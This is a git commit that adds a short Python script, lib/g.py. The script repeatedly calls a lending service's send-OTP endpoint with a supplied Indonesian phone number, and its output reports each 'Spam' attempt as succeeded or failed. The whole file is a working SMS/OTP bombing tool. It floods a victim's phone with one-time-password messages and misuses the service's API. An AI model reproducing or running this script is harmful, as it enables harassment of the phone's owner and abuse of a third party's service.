061dfe34a96003082641ed5922d91f0feb79f9da
AsecX <46747652+ArroKM@users.noreply.github.com>
2020-08-13 15:34:30 +0700

    Add files via upload

---
+++ lib/g.py
@@ -0,0 +1,15 @@
+import requests,os,sys,json
+from time import sleep
+from war.war import *
+
+def dana(nom, jml):
+	sleep(1)
+	print("")
+	for x in range(jml):
+		cal = requests.get("https://api.danacita.co.id/users/send_otp/?mobile_phone=0"+nom).text
+		if 'detail' in cal:
+			print(f"{r}[+] {c}Spam ke {k}+62{nom} {c}Berhasil ")
+			sleep(5)
+		else:
+			print(f"{k}[+] {c}Spam ke {k}+62{nom} {c}Gagal ")
+			sleep(2)
